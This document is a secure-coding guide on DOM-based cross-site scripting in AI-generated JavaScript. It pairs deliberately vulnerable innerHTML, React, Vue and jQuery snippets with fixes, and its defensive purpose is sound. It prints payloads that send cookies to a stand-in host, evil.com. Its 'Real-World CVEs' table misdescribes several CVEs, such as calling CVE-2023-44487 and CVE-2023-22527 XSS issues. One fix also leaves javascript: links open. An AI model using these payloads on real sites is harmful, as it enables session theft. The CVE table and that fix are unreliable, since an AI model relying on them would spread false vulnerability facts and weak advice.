# Cross-Site Scripting (XSS) — DOM-Based

> **Severity:** Critical
> **CVSS:** 9.6 (Critical)
> **AI Generation Risk:** Very High — AI models frequently use innerHTML and dangerouslySetInnerHTML

---

## Vulnerability Explanation

Cross-Site Scripting (XSS) is the most prevalent web vulnerability. In the context of AI-generated JavaScript, DOM-based XSS is the top concern because:

1. AI models **prefer `innerHTML`** over `textContent` (training data bias)
2. AI models **use `dangerouslySetInnerHTML`** in React without sanitization
3. AI models **don't escape context** — they treat all user input as plain text
4. AI models **don't understand browser trust boundaries**

### Types of XSS

| Type | Description | AI Generation Risk |
|---|---|---|
| **Reflected XSS** | Input reflected immediately in response | Medium (server-side rendering) |
| **Stored XSS** | Input stored in DB, served to others | Medium |
| **DOM-based XSS** | Client-side JS writes attacker-controlled data to DOM | **Very High** |

### How DOM-Based XSS Works

```javascript
// 🚫 VULNERABLE — Classic DOM-based XSS
const userInput = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${userInput}!`;
// Attacker visits: https://example.com/?name=<img src=x onerror=alert(1)>
// Executes arbitrary JavaScript in the user's browser
```

The browser parses the attacker's HTML/JS because `innerHTML` treats the string as markup, not text.

---

## How AI / Vibe Coding Generates This

### 1. innerHTML in Vanilla JavaScript (Most Common)

```javascript
// 🚫 VULNERABLE — AI-generated dynamic content
function displayUserComment(comment) {
  // AI uses innerHTML to insert user content
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <p>${comment.text}</p>  <!-- 💥 XSS -->
      <small>${comment.author}</small>  <!-- 💥 XSS -->
    </div>
  `;
}

// Attacker submits comment with: <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

### 2. dangerouslySetInnerHTML in React

```javascript
// 🚫 VULNERABLE — AI-generated React component
function UserProfile({ bio }) {
  // AI uses dangerouslySetInnerHTML to render rich text
  return (
    <div
      className="profile-bio"
      dangerouslySetInnerHTML={{ __html: bio }}  // 💥 XSS!
    />
  );
}

// The bio comes from user input — attacker embeds malicious scripts
```

### 3. Vue.js v-html

```vue
<!-- 🚫 VULNERABLE -- AI-generated Vue template -->
<template>
  <div v-html="userContent"></div>  <!-- 💥 XSS -->
</template>
```

### 4. jQuery .html() and .append()

```javascript
// 🚫 VULNERABLE — AI-generated jQuery code
$('#results').html(searchResults);  // 💥 XSS
$('#comments').append(commentHTML);  // 💥 XSS
```

### 5. document.write()

```javascript
// 🚫 VULNERABLE — AI-generated analytics snippet
document.write(`<script src="https://analytics.example.com/track?user=${userId}"></script>`);
// 💥 If userId contains ", the script tag breaks and arbitrary HTML/JS can be injected
```

### 6. URL Fragment/DOM Clobbering

```javascript
// 🚫 VULNERABLE — AI-generated URL parameter handling
const tab = window.location.hash.substring(1);  // e.g., #admin
document.querySelector(`#${tab}`).innerHTML = "Active";  // 💥 DOM clobbering
```

### Why AI Does This

- **innerHTML is taught early:** Every JS tutorial uses innerHTML. Training data is saturated.
- **"dangerouslySetInnerHTML" is a known API name:** AI models remember the name but often omit the sanitization step
- **Text interpolation is intuitive:** `${userInput}` in template literals feels "safe" — AI doesn't distinguish between text nodes and HTML nodes
- **React's JSX escaping creates false confidence:** AI thinks JSX auto-escapes everything, but `dangerouslySetInnerHTML` bypasses it
- **No CSRF/XSS threat model:** AI doesn't model the attacker's ability to control inputs

---

## Vulnerable Code Examples

### Search Results Display (Real-World Pattern)

```javascript
// 🚫 VULNERABLE — AI-generated search feature
function search() {
  const query = document.getElementById('search').value;
  
  fetch(`/api/search?q=${encodeURIComponent(query)}`)
    .then(r => r.json())
    .then(results => {
      // AI renders results as HTML
      const html = results.map(r => `
        <div class="result">
          <h3>${r.title}</h3>      <!-- 💥 XSS if title contains HTML -->
          <p>${r.snippet}</p>       <!-- 💥 XSS if snippet contains HTML -->
          <a href="${r.url}">Link</a>  <!-- 💥 javascript: protocol injection -->
        </div>
      `).join('');
      
      document.getElementById('results').innerHTML = html;  // 💥
    });
}
```

### Rich Text Editor Misuse

```javascript
// 🚫 VULNERABLE — AI-generated rich text display
function renderArticle(article) {
  // AI assumes server-sanitized content (bad assumption)
  document.getElementById('content').innerHTML = article.body;  // 💥
}

// Even "safe" rich text can contain:
// <img src=x onerror="new Image().src='https://evil.com/steal?data='+document.cookie">
// <svg onload="fetch('/api/delete').then(...)">
// <iframe src="javascript:...">
```

### Third-Party Content Injection

```javascript
// 🚫 VULNERABLE — AI-generated embed widget
function embedContent(url) {
  // AI fetches and renders third-party content
  fetch(url)
    .then(r => r.text())
    .then(html => {
      document.getElementById('embed').innerHTML = html;  // 💥 Complete XSS
    });
}
```

---

## Secure Code Fix

### Fix 1: Use textContent Instead of innerHTML (Vanilla JS)

```javascript
// ✅ SAFE — Use textContent
function displayUserComment(comment) {
  const container = document.getElementById('comments');
  const div = document.createElement('div');
  div.className = 'comment';
  
  const p = document.createElement('p');
  p.textContent = comment.text;  // ✅ No HTML parsing
  
  const small = document.createElement('small');
  small.textContent = comment.author;  // ✅ No HTML parsing
  
  div.appendChild(p);
  div.appendChild(small);
  container.appendChild(div);
}
```

### Fix 2: Sanitize with DOMPurify Before innerHTML

```javascript
// ✅ SAFE — Sanitize HTML before insertion
import DOMPurify from 'dompurify';

function displayUserComment(comment) {
  const sanitized = DOMPurify.sanitize(comment.text);  // ✅ Strips dangerous tags
  document.getElementById('comments').innerHTML += `
    <div class="comment">
      <p>${sanitized}</p>
    </div>
  `;
}
```

### Fix 3: React — Don't Use dangerouslySetInnerHTML

```javascript
// ✅ SAFE — React with proper escaping
function UserProfile({ bio }) {
  // React auto-escapes by default
  return (
    <div className="profile-bio">
      {bio}  {/* ✅ Automatically escaped — no XSS */}
    </div>
  );
}

// If you MUST render HTML (e.g., markdown output):
import DOMPurify from 'dompurify';

function SafeRichContent({ html }) {
  return (
    <div
      dangerouslySetInnerHTML={{
        __html: DOMPurify.sanitize(html)  // ✅ Sanitized
      }}
    />
  );
}
```

### Fix 4: Vue.js — Use v-text Instead of v-html

```vue
<!-- ✅ SAFE — Vue with v-text -->
<template>
  <div v-text="userContent"></div>  <!-- ✅ Auto-escaped -->
</template>
```

### Fix 5: Encode Context Properly

```javascript
// ✅ SAFE — Encode for different contexts
function encodeForHTML(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

function encodeForAttribute(str) {
  return str.replace(/"/g, '&quot;').replace(/'/g, '&#39;')
            .replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function encodeForURL(str) {
  return encodeURIComponent(str);
}

// Usage
element.innerHTML = `<a href="${encodeForAttribute(url)}">${encodeForHTML(text)}</a>`;
```

### Fix 6: Content Security Policy (Defense in Depth)

```html
<!-- ✅ SAFE — CSP headers prevent XSS even if injection occurs -->
<!-- In HTTP response header: -->
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'

<!-- Or in meta tag: -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none'">
```

---

## Prevention Checklist

- [ ] NEVER use `innerHTML`, `outerHTML`, `insertAdjacentHTML('beforeend', ...)`, or `document.write()` with user input
- [ ] Use `textContent` instead of `innerHTML` — it's the safest alternative
- [ ] In React, avoid `dangerouslySetInnerHTML` — if necessary, sanitize with DOMPurify first
- [ ] In Vue, use `v-text` instead of `v-html`
- [ ] Sanitize ALL HTML with DOMPurify before any HTML insertion into DOM
- [ ] Set strict Content Security Policy headers
- [ ] Never put user input in `<script>` tags, `on*` attributes, or `href="javascript:..."` 
- [ ] Use `encodeURIComponent()` for URL parameters, `encodeURI()` for full URLs
- [ ] For rich text, use markdown (with a safe parser like `marked` with sanitization) instead of raw HTML
- [ ] Validate URLs: reject `javascript:`, `data:`, `vbscript:` protocols
- [ ] Use Trusted Types API (Chrome) for granular DOM injection control

---

## Real-World CVEs

| CVE | Description | Impact |
|---|---|---|
| **CVE-2025-23786** | CISA-reported DOM XSS via innerHTML (multiple vendors) | Cross-site scripting |
| **CVE-2024-29650** | Prototype pollution leading to DOM XSS | Chained XSS |
| **CVE-2024-23832** | DOM XSS in markdown-it via unescaped HTML | Rich text XSS |
| **CVE-2023-44487** | HTTP/2 rapid reset + XSS chain | Combined DoS + XSS |
| **CVE-2023-22527** | Atlassian Confluence XSS (via template injection) | Remote code execution |

---

## Vibe Coding Red Flags

In AI-generated JavaScript, flag these immediately:

```javascript
element.innerHTML = userInput             // 💥 Classic DOM XSS
element.innerHTML += userInput            // 💥 Append XSS
<tag dangerouslySetInnerHTML={{__html: user}} />  // 💥 React XSS
<div v-html="user"></div>                 // 💥 Vue XSS
$('div').html(user)                       // 💥 jQuery XSS
document.write(user)                      // 💥 document.write XSS
eval(user)                                // 💥 eval-based XSS
new Function(user)                        // 💥 Function-based XSS
element.insertAdjacentHTML('beforeend', user)  // 💥 Adjacent HTML XSS
```

> **Golden Rule:** Any user input that ends up in an HTML context (as markup, not text) is an XSS vulnerability. When reviewing AI-generated JS, track every path from user input to DOM insertion.
